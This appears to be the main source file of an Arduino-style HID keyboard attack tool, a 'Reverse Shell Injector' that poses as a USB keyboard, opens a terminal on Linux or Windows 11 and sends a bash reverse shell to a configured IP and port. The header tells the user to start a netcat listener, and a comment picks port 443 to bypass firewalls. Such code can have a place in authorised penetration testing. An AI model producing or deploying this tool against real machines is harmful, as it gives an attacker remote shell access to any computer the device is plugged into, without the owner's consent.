/*
  ============================================================
   Reverse Shell Injector via HID Keyboard
  ============================================================

  Board Setting:
    Tools > USB Type > Keyboard

  Description:
    Launches a terminal, and sends a bash reverse shell payload
    to a listening host/port.

  Notes:
    Open the port on your machine using `nc -lvnp 443`.
    Enable the desired target operating system.

  Author: NenshaM
  License: GPL v3
  Version: 1.5.0
  ============================================================
*/

#include "Payload.h"

// Select reverse shell target OS
#if false 
    #include "Win11Payload.h"
    Win11Payload payload;
#else
    #include "LinuxPayload.h"
    LinuxPayload payload;
#endif

// ================= USER CONFIGURATION =================
// Enable Serial debug output
const bool debug = true;
const char* ip_addr = "192.168.1.191";
const char* port_num = "443"; // use 443 to bypass firewall

// ================= SETUP =================

void setup() {
  // Initialize Serial for debugging
  if (debug) {
    Serial.begin(115200);
    delay(1000);
    Serial.println("Reverse Shell Injector Started");
  }

  // Seed random generator using floating analog pin
  randomSeed(analogRead(0));

  // Launch terminal
  payload.openTerminal(debug);

  // Execute reverse shell payload
  payload.executePayload(ip_addr, port_num, debug);
}

void loop() {
  // no repeated action
}